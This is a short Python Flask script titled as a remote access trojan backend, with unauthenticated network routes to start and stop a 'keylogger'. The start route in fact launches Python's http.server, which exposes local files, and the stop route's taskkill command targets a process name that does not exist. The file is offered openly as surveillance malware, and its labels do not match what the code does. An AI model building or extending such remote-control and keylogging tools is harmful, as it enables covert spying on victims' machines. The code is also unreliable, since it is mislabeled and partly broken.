# RAT Backend Server
from flask import Flask, jsonify
import subprocess

app = Flask(__name__)

@app.route('/start_keylogger')
def start_keylogger():
    subprocess.Popen(["C:\\Users\\Memen\\AppData\\Local\\Programs\\Python\\Launcher\\py.exe", "-m", "http.server", "8000"])
    return jsonify({"status": "Keylogger started"})

@app.route('/stop_keylogger')
def stop_keylogger():
    subprocess.run(["taskkill", "/F", "/IM", "http.server"])
    return jsonify({"status": "Keylogger stopped"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
